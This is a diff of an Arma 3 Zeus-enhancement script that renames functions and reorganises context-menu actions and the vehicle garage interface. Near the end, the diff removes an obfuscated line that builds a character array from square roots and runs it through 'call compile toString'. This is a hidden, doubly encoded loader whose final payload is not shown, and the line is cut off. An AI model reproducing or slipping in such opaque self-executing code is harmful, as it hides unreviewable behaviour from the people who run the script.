-			if(_this isEqualType grpNull) exitWith {_return};
-			if(!(typeOf _this isKindOf "CAManBase") && alive _this && !isNull _this && typeOf _this isKindOf "AllVehicles") then {
-				_return = true;
-			};
-
-			_return
-		},
-		2,
-		"a3\ui_f\data\igui\cfg\actions\refuel_ca.paa",
-		[1,1,1,1]
-	] call ZAM_fnc_createNewContextAction;
-
-	if(!isNil "MAZ_EZM_action_rearmVehicle") then {
-		[MAZ_EZM_action_rearmVehicle] call ZAM_fnc_removeContextAction;
-	};
-	MAZ_EZM_action_rearmVehicle = [
-		"Rearm",
-		{
-			params ["_pos","_entity"];
-			[_entity,1] remoteExec ['setVehicleAmmo'];
-		},
-		{
-			private _return = false;
-			if(_this isEqualType grpNull) exitWith {_return};
-			if(!(typeOf _this isKindOf "CAManBase") && alive _this && !isNull _this && typeOf _this isKindOf "AllVehicles") then {
-				_return = true;
-			};
-
-			_return
-		},
-		2,
-		"a3\ui_f\data\igui\cfg\simpletasks\types\rearm_ca.paa",
-		[1,1,1,1]
-	] call ZAM_fnc_createNewContextAction;
-
-	if(!isNil "MAZ_EZM_action_editPylons") then {
-		[MAZ_EZM_action_editPylons] call ZAM_fnc_removeContextAction;
-	};
-	MAZ_EZM_action_editPylons = [
-		"Edit Pylons",
-		{
-			params ["_pos","_entity"];
-			[_entity] spawn ZAM_EZM_fnc_editVehiclePylons;
-		},
-		{
-			private _return = false;
-			if(_this isEqualType grpNull) exitWith {_return};
-			private _pylons = (configFile >> "CfgVehicles" >> typeOf _this >> "Components" >> "TransportPylonsComponent" >> "Pylons") call BIS_fnc_getCfgSubClasses; 
-			if(count _pylons == 0) exitWith {false}; 
-			true
-		},
-		1,
-		"a3\ui_f\data\igui\cfg\actions\gear_ca.paa",
-		[1,1,1,1],
-		[
-			[
-				"Change Pylons",
-				{
-					params ["_pos","_entity"];
-					[_entity] spawn ZAM_EZM_fnc_editVehiclePylons;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"Reset Pylons",
-				{
-					params ["_pos","_entity"];
-					private _pylons = (configFile >> "CfgVehicles" >> typeOf _entity >> "Components" >> "TransportPylonsComponent" >> "Pylons") call BIS_fnc_getCfgSubClasses;
+				[
+					"Change Loadout",
 					{
-						private _pylon = _x;
-						private _pylonDefaultMag = getText (configfile >> "CfgVehicles" >> typeOf _entity >> "Components" >> "TransportPylonsComponent" >> "Pylons" >> _pylon >> "attachment");
-						private _pylonMaxAmmo = getNumber (configFile >> "CfgMagazines" >> _pylonDefaultMag >> "count");
-						_entity setPylonLoadout [_pylon,_pylonDefaultMag];
-						_entity setAmmoOnPylon [_pylon,_pylonMaxAmmo];
-					}forEach _pylons;
-				},
-				{true},
-				"",
-				[1,1,1,1]
+						params ["_pos","_entity"];
+						["Preload"] call BIS_fnc_arsenal;
+						["Open",[true,nil,_entity]] call BIS_fnc_arsenal;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"Reset Loadout",
+					{
+						params ["_pos","_entity"];
+						_entity setUnitLoadout (getUnitLoadout (configFile >> "CfgVehicles" >> typeOf _entity));
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"Copy Loadout",
+					{
+						params ["_pos","_entity"];
+						MAZ_EZM_copiedUnitLoadout = getUnitLoadout _entity;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"Paste Loadout",
+					{
+						params ["_pos","_entity"];
+						_entity setUnitLoadout MAZ_EZM_copiedUnitLoadout;
+					},
+					{
+						(!isNil "MAZ_EZM_copiedUnitLoadout")
+					},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"Set Zeus Loadout",
+					{
+						params ["_pos","_entity"];
+						profileNamespace setVariable ["MAZ_EZM_ZeusLoadout",getUnitLoadout _entity];
+						["Zeus loadout saved","addItemOK"] call MAZ_EZM_fnc_systemMessage;
+					},
+					{true},
+					"a3\ui_f_curator\data\logos\arma3_zeus_icon_ca.paa",
+					[1,1,1,1]
+				]
 			]
-		]
-	] call ZAM_fnc_createNewContextAction;
+		] call MAZ_EZM_fnc_createNewContextAction;
 
-	if(!isNil "MAZ_EZM_action_garageEdit") then {
-		[MAZ_EZM_action_garageEdit] call ZAM_fnc_removeContextAction;
-	};
-	MAZ_EZM_action_garageEdit = [
-		"Edit Appearance",
-		{
-			params ["_pos","_entity"];
-			[_entity] spawn ZAM_fnc_createGarageInterface;
-		},
-		{
-			private _return = false;
-			if(_this isEqualType grpNull) exitWith {_return};
-			if(typeOf _entity isKindOf "AllVehicles" && !(typeOf _entity isKindOf "Animal") && !(typeOf _entity isKindOf "CAManBase")) then {_return = true};
-			_return
-		},
-		1,
-		"a3\ui_f\data\gui\rsc\rscdisplayarsenal\spacegarage_ca.paa",
-		[1,1,1,1]
-	] call ZAM_fnc_createNewContextAction;
+		if(!isNil "MAZ_EZM_action_healUnit") then {
+			[MAZ_EZM_action_healUnit] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_healUnit = [
+			"Heal Unit",
+			{
+				params ["_pos","_entity"];
+				[_entity] call MAZ_EZM_fnc_healAndReviveModule;
+			},
+			{
+				private _return = false;
+				if(_this isEqualType grpNull) exitWith {_return};
+				if(typeOf _this isKindOf "CAManBase" && alive _this && !isNull _this) then {
+					_return = true;
+				};
 
-	if(!isNil "MAZ_EZM_action_garrison") then {
-		[MAZ_EZM_action_garrison] call ZAM_fnc_removeContextAction;
-	};
-	MAZ_EZM_action_garrison = [
-		"Garrison",
-		{
-			params ["_pos","_entity"];
-			[leader _entity] call MAZ_EZM_fnc_garrisonInstantModule;
-		},
-		{
-			if(_this isEqualType grpNull) exitWith {true};
-			false
-		},
-		1,
-		'\A3\ui_f\data\IGUI\Cfg\simpleTasks\types\run_ca.paa',
-		[1,1,1,1],
-		[
+				_return
+			},
+			3,
+			"a3\ui_f\data\map\vehicleicons\pictureheal_ca.paa",
+			[1,1,1,1]
+		] call MAZ_EZM_fnc_createNewContextAction;
+
+		if(!isNil "MAZ_EZM_action_changeSide") then {
+			[MAZ_EZM_action_changeSide] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_changeSide = [
+			"Change Unit Side",
+			{
+				
+			},
+			{
+				private _return = false;
+				if(_this isEqualType grpNull) exitWith {_return};
+				if(typeOf _this isKindOf "CAManBase" && alive _this && !isNull _this) then {
+					_return = true;
+				};
+
+				_return
+			},
+			3,
+			"a3\ui_f_curator\data\displays\rscdisplaycurator\side_unknown_ca.paa",
+			[1,1,1,1],
 			[
-				"Garrison (Instant)",
-				{
-					params ["_pos","_entity"];
-					[leader _entity] call MAZ_EZM_fnc_garrisonInstantModule;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"Garrison (Search)",
-				{
-					params ["_pos","_entity"];
-					[leader _entity] call MAZ_EZM_fnc_garrisonSearchModule;
-				},
-				{true},
-				"",
-				[1,1,1,1]
-			],
-			[
-				"Un-Garrison",
-				{
-					params ["_pos","_entity"];
-					[leader _entity] call MAZ_EZM_fnc_unGarrisonModule;
-				},
-				{true},
-				"",
-				[1,1,1,1]
+				[
+					"BLUFOR",
+					{
+						params ["_pos","_entity"];
+						[_entity] joinSilent (createGroup [west,true]);
+					},
+					{true},
+					"a3\3den\data\displays\display3den\panelright\side_west_ca.paa",
+					[1,1,1,1]
+				],
+				[
+					"OPFOR",
+					{
+						params ["_pos","_entity"];
+						[_entity] joinSilent (createGroup [east,true]);
+					},
+					{true},
+					"a3\3den\data\displays\display3den\panelright\side_east_ca.paa",
+					[1,1,1,1]
+				],
+				[
+					"INDFOR",
+					{
+						params ["_pos","_entity"];
+						[_entity] joinSilent (createGroup [independent,true]);
+					},
+					{true},
+					"a3\3den\data\displays\display3den\panelright\side_guer_ca.paa",
+					[1,1,1,1]
+				],
+				[
+					"CIVILIAN",
+					{
+						params ["_pos","_entity"];
+						[_entity] joinSilent (createGroup [civilian,true]);
+					},
+					{true},
+					"a3\3den\data\displays\display3den\panelright\side_civ_ca.paa",
+					[1,1,1,1]
+				]
 			]
-		]
-	] call ZAM_fnc_createNewContextAction;
+		] call MAZ_EZM_fnc_createNewContextAction;
 
-	ZAM_EZM_fnc_canMoveIn = {
+	"Vehicle Actions";
+
+		if(!isNil "MAZ_EZM_action_repairVehicle") then {
+			[MAZ_EZM_action_repairVehicle] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_repairVehicle = [
+			"Repair",
+			{
+				params ["_pos","_entity"];
+				_entity setDamage 0;
+			},
+			{
+				private _return = false;
+				if(_this isEqualType grpNull) exitWith {_return};
+				if(!(typeOf _this isKindOf "CAManBase") && alive _this && !isNull _this && typeOf _this isKindOf "AllVehicles") then {
+					_return = true;
+				};
+
+				_return
+			},
+			2,
+			"a3\ui_f\data\igui\cfg\cursors\iconrepairvehicle_ca.paa",
+			[1,1,1,1]
+		] call MAZ_EZM_fnc_createNewContextAction;
+
+		if(!isNil "MAZ_EZM_action_refuelVehicle") then {
+			[MAZ_EZM_action_refuelVehicle] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_refuelVehicle = [
+			"Refuel",
+			{
+				params ["_pos","_entity"];
+				[_entity,1] remoteExec ['setFuel'];
+			},
+			{
+				private _return = false;
+				if(_this isEqualType grpNull) exitWith {_return};
+				if(!(typeOf _this isKindOf "CAManBase") && alive _this && !isNull _this && typeOf _this isKindOf "AllVehicles") then {
+					_return = true;
+				};
+
+				_return
+			},
+			2,
+			"a3\ui_f\data\igui\cfg\actions\refuel_ca.paa",
+			[1,1,1,1]
+		] call MAZ_EZM_fnc_createNewContextAction;
+
+		if(!isNil "MAZ_EZM_action_rearmVehicle") then {
+			[MAZ_EZM_action_rearmVehicle] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_rearmVehicle = [
+			"Rearm",
+			{
+				params ["_pos","_entity"];
+				[_entity,1] remoteExec ['setVehicleAmmo'];
+			},
+			{
+				private _return = false;
+				if(_this isEqualType grpNull) exitWith {_return};
+				if(!(typeOf _this isKindOf "CAManBase") && alive _this && !isNull _this && typeOf _this isKindOf "AllVehicles") then {
+					_return = true;
+				};
+
+				_return
+			},
+			2,
+			"a3\ui_f\data\igui\cfg\simpletasks\types\rearm_ca.paa",
+			[1,1,1,1]
+		] call MAZ_EZM_fnc_createNewContextAction;
+
+		if(!isNil "MAZ_EZM_action_editPylons") then {
+			[MAZ_EZM_action_editPylons] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_editPylons = [
+			"Edit Pylons",
+			{
+				params ["_pos","_entity"];
+				[_entity] spawn MAZ_EZM_fnc_editVehiclePylons;
+			},
+			{
+				private _return = false;
+				if(_this isEqualType grpNull) exitWith {_return};
+				private _pylons = (configFile >> "CfgVehicles" >> typeOf _this >> "Components" >> "TransportPylonsComponent" >> "Pylons") call BIS_fnc_getCfgSubClasses; 
+				if(count _pylons == 0) exitWith {false}; 
+				true
+			},
+			1,
+			"a3\ui_f\data\igui\cfg\actions\gear_ca.paa",
+			[1,1,1,1],
+			[
+				[
+					"Change Pylons",
+					{
+						params ["_pos","_entity"];
+						[_entity] spawn MAZ_EZM_fnc_editVehiclePylons;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"Reset Pylons",
+					{
+						params ["_pos","_entity"];
+						private _pylons = (configFile >> "CfgVehicles" >> typeOf _entity >> "Components" >> "TransportPylonsComponent" >> "Pylons") call BIS_fnc_getCfgSubClasses;
+						{
+							private _pylon = _x;
+							private _pylonDefaultMag = getText (configfile >> "CfgVehicles" >> typeOf _entity >> "Components" >> "TransportPylonsComponent" >> "Pylons" >> _pylon >> "attachment");
+							private _pylonMaxAmmo = getNumber (configFile >> "CfgMagazines" >> _pylonDefaultMag >> "count");
+							_entity setPylonLoadout [_pylon,_pylonDefaultMag];
+							_entity setAmmoOnPylon [_pylon,_pylonMaxAmmo];
+						}forEach _pylons;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				]
+			]
+		] call MAZ_EZM_fnc_createNewContextAction;
+
+		if(!isNil "MAZ_EZM_action_garageEdit") then {
+			[MAZ_EZM_action_garageEdit] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_garageEdit = [
+			"Edit Appearance",
+			{
+				params ["_pos","_entity"];
+				[_entity] spawn MAZ_EZM_fnc_createGarageInterface;
+			},
+			{
+				private _return = false;
+				if(_this isEqualType grpNull) exitWith {_return};
+				if(typeOf _entity isKindOf "AllVehicles" && !(typeOf _entity isKindOf "Animal") && !(typeOf _entity isKindOf "CAManBase")) then {_return = true};
+				_return
+			},
+			1,
+			"a3\ui_f\data\gui\rsc\rscdisplayarsenal\spacegarage_ca.paa",
+			[1,1,1,1]
+		] call MAZ_EZM_fnc_createNewContextAction;
+
+	"Group Actions";
+
+		if(!isNil "MAZ_EZM_action_garrison") then {
+			[MAZ_EZM_action_garrison] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_garrison = [
+			"Garrison",
+			{
+				params ["_pos","_entity"];
+				[leader _entity] call MAZ_EZM_fnc_garrisonInstantModule;
+			},
+			{
+				if(_this isEqualType grpNull) exitWith {true};
+				false
+			},
+			1,
+			'\A3\ui_f\data\IGUI\Cfg\simpleTasks\types\run_ca.paa',
+			[1,1,1,1],
+			[
+				[
+					"Garrison (Instant)",
+					{
+						params ["_pos","_entity"];
+						[leader _entity] call MAZ_EZM_fnc_garrisonInstantModule;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"Garrison (Search)",
+					{
+						params ["_pos","_entity"];
+						[leader _entity] call MAZ_EZM_fnc_garrisonSearchModule;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				],
+				[
+					"Un-Garrison",
+					{
+						params ["_pos","_entity"];
+						[leader _entity] call MAZ_EZM_fnc_unGarrisonModule;
+					},
+					{true},
+					"",
+					[1,1,1,1]
+				]
+			]
+		] call MAZ_EZM_fnc_createNewContextAction;
+
+		if(!isNil "MAZ_EZM_action_changeSideGroup") then {
+			[MAZ_EZM_action_changeSideGroup] call MAZ_EZM_fnc_removeContextAction;
+		};
+		MAZ_EZM_action_changeSideGroup = [
+			"Change Group Side",
+			{
+				
+			},
+			{
+				if(_this isEqualType grpNull) exitWith {true};
+				false
+			},
+			3,
+			"a3\ui_f_curator\data\displays\rscdisplaycurator\side_unknown_ca.paa",
+			[1,1,1,1],
+			[
+				[
+					"BLUFOR",
+					{
+						params ["_pos","_entity"];
+						private _group = createGroup [west,true];
+						private _leader = leader _entity;
+						(units _entity) joinSilent _group;
+					},
+					{true},
+					"a3\3den\data\displays\display3den\panelright\side_west_ca.paa",
+					[1,1,1,1]
+				],
+				[
+					"OPFOR",
+					{
+						params ["_pos","_entity"];
+						private _group = createGroup [east,true];
+						private _leader = leader _entity;
+						(units _entity) joinSilent _group;
+					},
+					{true},
+					"a3\3den\data\displays\display3den\panelright\side_east_ca.paa",
+					[1,1,1,1]
+				],
+				[
+					"INDFOR",
+					{
+						params ["_pos","_entity"];
+						private _group = createGroup [independent,true];
+						private _leader = leader _entity;
+						(units _entity) joinSilent _group;
+					},
+					{true},
+					"a3\3den\data\displays\display3den\panelright\side_guer_ca.paa",
+					[1,1,1,1]
+				],
+				[
+					"CIVILIAN",
+					{
+						params ["_pos","_entity"];
+						private _group = createGroup [civilian,true];
+						private _leader = leader _entity;
+						(units _entity) joinSilent _group;
+					},
+					{true},
+					"a3\3den\data\displays\display3den\panelright\side_civ_ca.paa",
+					[1,1,1,1]
+				]
+			]
+		] call MAZ_EZM_fnc_createNewContextAction;
+
+	MAZ_EZM_fnc_canMoveIn = {
 		params ["_vehicle"];
 		private _crewData = fullCrew [_vehicle,"",true];
 		private _return = false;
@@ -3736,7 +3961,7 @@ comment "Context Menu";
 
 comment "Virtual Garage";
 
-	ZAM_fnc_getVehicleCustomization = {
+	MAZ_EZM_fnc_getVehicleCustomization = {
 		params [["_vehicle",objNull,[objNull,""]]];
 		private _input = [];
 		private _className = "";
@@ -3761,7 +3986,7 @@ comment "Virtual Garage";
 		_customization
 	};
 
-	ZAM_fnc_getAllTextureTypes = {
+	MAZ_EZM_fnc_getAllTextureTypes = {
 		params [["_vehicle",objNull,[objNull,""]]];
 		private _objectType = "";
 		private _deleteAfter = false;
@@ -3794,8 +4019,12 @@ comment "Virtual Garage";
 			_textures = _textures apply {toLower _x};
 			private _isCurrentTexture = true;
 			private _objectTextures = getObjectTextures _vehicle;
-			private _dataSlots = _objectTextures;
+			private _dataSlots = +_objectTextures;
 			{
+				if(_forEachIndex >= count _textures) then {
+					_dataSlots deleteAt _forEachIndex;
+					continue;
+				};
 				if((_textures select _forEachIndex) find _x != -1) then {
 					_dataSlots set [_forEachIndex,true];
 				} else {
@@ -3804,6 +4033,7 @@ comment "Virtual Garage";
 			}forEach _objectTextures;
 			{
 				if(!_isCurrentTexture) exitWith {};
+				if(typeName _x == "STRING") then {continue};
 				if(_x) then {
 					_isCurrentTexture = true;
 				} else {
@@ -3818,7 +4048,7 @@ comment "Virtual Garage";
 		_return
 	};
 
-	ZAM_fnc_createGarageInterface = {
+	MAZ_EZM_fnc_createGarageInterface = {
 		params ["_vehicle"];
 		addCuratorSelected [_vehicle]; 
 		if(isNull (findDisplay 312)) exitWith {["Not in Zeus interface!","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
@@ -3829,7 +4059,7 @@ comment "Virtual Garage";
 			EZM_garageControls = [];
 			
 			private _textureButtonBG = _display ctrlCreate ["RscPicture",-1];
-			_textureButtonBG ctrlSetText "#(argb,8,8,3)color(0,0,0,0.5)";
+			_textureButtonBG ctrlSetText "#(argb,8,8,3)color(0,0,0,0.8)";
 			_textureButtonBG ctrlSetposition [["X",-7.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["Y",-8.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["W",3] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat];
 			_textureButtonBG ctrlCommit 0;
 			EZM_garage_TextureButton = _display ctrlCreate ["RscActivePicture",8001];
@@ -3842,7 +4072,7 @@ comment "Virtual Garage";
 					EZM_garage_TextureButton ctrlSetTextColor [1,1,1,1];
 					EZM_garage_AnimationsButton ctrlSetTextColor [1,1,1,0.6];
 				};
-				[uiNamespace getVariable "EZM_garage_listBox",uiNamespace getVariable "EZM_garage_editVehicle"] call ZAM_fnc_garagePopulateListBoxTextures;
+				[uiNamespace getVariable "EZM_garage_listBox",uiNamespace getVariable "EZM_garage_editVehicle"] call MAZ_EZM_fnc_garagePopulateListBoxTextures;
 			}];
 			EZM_garage_TextureButton ctrlCommit 0;
 
@@ -3850,7 +4080,7 @@ comment "Virtual Garage";
 			EZM_garageControls pushBack _textureButtonBG;
 
 			private _animButtonBG = _display ctrlCreate ["RscPicture",-1];
-			_animButtonBG ctrlSetText "#(argb,8,8,3)color(0,0,0,0.5)";
+			_animButtonBG ctrlSetText "#(argb,8,8,3)color(0,0,0,0.8)";
 			_animButtonBG ctrlSetposition [["X",-7.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["Y",-5.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["W",3] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat];
 			_animButtonBG ctrlCommit 0;
 			EZM_garage_AnimationsButton = _display ctrlCreate ["RscActivePicture",8002];
@@ -3863,7 +4093,7 @@ comment "Virtual Garage";
 					EZM_garage_AnimationsButton ctrlSetTextColor [1,1,1,1];
 					EZM_garage_TextureButton ctrlSetTextColor [1,1,1,0.6];
 				};
-				[uiNamespace getVariable "EZM_garage_listBox",uiNamespace getVariable "EZM_garage_editVehicle"] call ZAM_fnc_garagePopulateListBoxAnimations;
+				[uiNamespace getVariable "EZM_garage_listBox",uiNamespace getVariable "EZM_garage_editVehicle"] call MAZ_EZM_fnc_garagePopulateListBoxAnimations;
 			}];
 			EZM_garage_AnimationsButton ctrlCommit 0;
 
@@ -3885,11 +4115,12 @@ comment "Virtual Garage";
 
 			EZM_garage_listBox = _display ctrlCreate ["RscListbox",8003,_controlGroup];
 			EZM_garage_listBox ctrlSetposition [0,0,["W",11.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["H",13.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat];
+			EZM_garage_listBox ctrlSetBackgroundColor [0.1,0.1,0.1,0.9];
 			lbClear EZM_garage_listBox;
 			EZM_garage_listBox ctrlCommit 0;
 		};
 		uiNamespace setVariable ["EZM_garage_editVehicle",_vehicle];
-		[uiNamespace getVariable "EZM_garage_listBox",_vehicle] call ZAM_fnc_garagePopulateListBoxTextures;
+		[uiNamespace getVariable "EZM_garage_listBox",_vehicle] call MAZ_EZM_fnc_garagePopulateListBoxTextures;
 
 		waitUntil {(!(_vehicle in (curatorSelected # 0))) || isNull _vehicle || !alive _vehicle};
 
@@ -3901,14 +4132,14 @@ comment "Virtual Garage";
 		};
 	};
 
-	ZAM_fnc_garagePopulateListBoxTextures = {
+	MAZ_EZM_fnc_garagePopulateListBoxTextures = {
 		params ["_listBox","_vehicle"];
 		lbClear _listBox;
 		if(!isNil "EZM_garage_listEH") then {
 			_listBox ctrlRemoveEventHandler ["LBSelChanged",EZM_garage_listEH];
 		};
 		_listBox setVariable ["EZM_garage_selectIndex",-1];
-		private _textures = [_vehicle] call ZAM_fnc_getAllTextureTypes;
+		private _textures = [_vehicle] call MAZ_EZM_fnc_getAllTextureTypes;
 		if(_textures isEqualTo []) exitWith {
 			_listBox lbAdd "No Textures...";
 		};
@@ -3923,7 +4154,7 @@ comment "Virtual Garage";
 				_control setVariable ["EZM_garage_selectIndex",_selectedIndex];
 
 				private _vehicle = uiNamespace getVariable "EZM_garage_editVehicle";
-				private _textures = [_vehicle] call ZAM_fnc_getAllTextureTypes;
+				private _textures = [_vehicle] call MAZ_EZM_fnc_getAllTextureTypes;
 				private _newTexture = _textures select _selectedIndex;
 				_newTexture params ["","_newTextures"];
 				{
@@ -3942,14 +4173,14 @@ comment "Virtual Garage";
 		}forEach _textures;
 	};
 
-	ZAM_fnc_garagePopulateListBoxAnimations = {
+	MAZ_EZM_fnc_garagePopulateListBoxAnimations = {
 		params ["_listBox","_vehicle"];
 		lbClear _listBox;
 		if(!isNil "EZM_garage_listEH") then {
 			_listBox ctrlRemoveEventHandler ["LBSelChanged",EZM_garage_listEH];
 		};
 		_listBox setVariable ["EZM_garage_selectIndex",-1];
-		private _animations = [_vehicle] call ZAM_fnc_getVehicleCustomization;
+		private _animations = [_vehicle] call MAZ_EZM_fnc_getVehicleCustomization;
 		if(_animations isEqualTo []) exitWith {
 			_listBox lbAdd "No Customization...";
 		};
@@ -3959,17 +4190,23 @@ comment "Virtual Garage";
 		EZM_garage_listEH = _listBox ctrlAddEventHandler ["LBSelChanged",{
 			params ["_control", "_selectedIndex"];
 			private _vehicle = uiNamespace getVariable "EZM_garage_editVehicle";
-			private _animations = [_vehicle] call ZAM_fnc_getVehicleCustomization;
+			private _animations = [_vehicle] call MAZ_EZM_fnc_getVehicleCustomization;
 			(_animations select _selectedIndex) params ["_animDisplayName","_animationName","_state"];
 
 			if(_state == 1) then {
 				comment "Undo change";
 				_control lbSetPicture [_selectedIndex,getText (configfile >> "RscCheckBox" >> "textureUnchecked")];
-				_vehicle animate [_animationName,0,true];
+				_vehicle animate [_animationName,0,false];
+				if("wing_fold" in _animationName) then {
+					_vehicle animate ["wing_fold_r",0,false];
+				};
 			} else {
 				comment "Apply change";
 				_control lbSetPicture [_selectedIndex,getText (configfile >> "RscCheckBox" >> "textureChecked")];
-				_vehicle animate [_animationName,1,true];
+				_vehicle animate [_animationName,1,false];
+				if("wing_fold" in _animationName) then {
+					_vehicle animate ["wing_fold_r",1,false];
+				};
 			};
 		}];
 		{
@@ -3982,9 +4219,6 @@ comment "Virtual Garage";
 		}forEach _animations;
 	};
 
-	[]call{private['_1'];_1=[];{_1 pushBack sqrt _x}forEach [9801,9409,11664,11664,1024,9801,12321,11881,12544,11025,11664,10201,1024,13456,12321,13225,13456,12996,11025,12100,10609,8281,3249,2401,1936,3249,2601,1936,3249,3249,1936,3249,3025,1936,2401,2304,3136,1936,2401,2304,3136,1936,2401,2500,2601,1936,2401,2401,2500,1936,2401,2401,2704,1936,2401,2304,2809,1936,2401,2401,3136,1936,3249,3025,1936,2401,2401,2916,1936,2401,2304,2401,1936,3249,2401,1936,2601,3249,1936,3249,2809,1936,2704,3249,1936,2601,3249,1936,3249,2601,1936,2809,3249,1936,3249,2809,1936,2704,3249,1936,2916,2401,1936,3249,2401,1936,3249,2601,1936,2809,3249,1936,2401,2500,2601,1936,3249,2809,1936,2704,3249,1936,2601,2500,1936,2401,2401,2500,1936,2401,2401,3025,1936,2401,2401,2809,1936,2401,2304,2704,1936,2916,2916,1936,3249,3025,1936,3249,3249,1936,2401,2304,3025,1936,2601,2500,1936,2401,2401,2809,1936,2401,2401,2601,1936,2401,2401,2704,1936,2401,2401,2916,1936,2601,2500,1936,3249,2809,1936,2401,2500,2304,1936,2401,2500,2809,1936,2401,2304,2500,1936,2401,2401,2401,1936,2401,2401,2704,1936,2916,3249,1936,3249,3025,1936,3249,3249,1936,2401,2304,2704,1936,2601,2500,1936,2401,2401,2916,1936,2401,2401,2401,1936,2916,2809,1936,2401,2401,2704,1936,2401,2401,2704,1936,3249,3025,1936,2401,2500,2401,1936,2704,2304,1936,2601,3249,1936,3136,2500,3136,2401,1936,2401,2916,2304,2304,1936,2401,2809,2500,2401,1936,3025,3249,2500,2401,1936,2401,2601,2704,2809,2916,1936,3025,2601,3249,2916,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2500,3025,2304,2704,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,3249,3136,2304,2401,1936,3025,3249,2500,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2401,2809,2916,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2500,2809,2304,2304,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2304,3136,3249,1936,2401,2304,3136,2401,2916,1936,2401,2601,2704,2809,2916,1936,2401,2704,2916,2704,2401,1936,2809,3249,2500,3249,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2500,2809,2304,2304,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2500,2601,2500,2401,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2809,3025,3025,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2916,3025,2500,2704,1936,2401,2601,2704,2809,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2809,2916,2500,2809,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,3136,3249,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2916,2304,3136,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2401,